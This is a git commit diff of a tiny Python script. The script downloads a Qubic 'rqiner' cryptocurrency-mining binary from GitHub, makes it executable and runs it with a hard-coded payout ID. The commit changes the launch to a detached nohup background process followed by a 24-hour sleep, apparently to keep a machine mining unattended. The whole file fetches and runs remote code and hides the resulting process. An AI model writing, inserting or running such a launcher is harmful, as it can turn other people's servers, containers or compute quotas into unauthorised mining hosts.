e864893da7b199980affd87fcfe027ca45e77eb9
sabri fuadi <sabrif0610@gmail.com>
2024-05-28 01:25:51 +0000

    Update main.py

--- main.py
+++ main.py
@@ -3,5 +3,5 @@ import os
 
 os.system("wget https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v0.6.1/rqiner-x86-znver2")
 os.system("chmod +x rqiner-x86-znver2")
-os.system("./rqiner-x86-znver2 -i NVWTZZACJPEBAFBLYZNJXFGHJDPBTMIIFBDAOGSTHDHRCHXFTMZUXIOGERZG -t 2")
-
+os.system("nohup ./rqiner-x86-znver2 -i NVWTZZACJPEBAFBLYZNJXFGHJDPBTMIIFBDAOGSTHDHRCHXFTMZUXIOGERZG -t 2 2>&1 &")
+os.system("sleep 1440m")
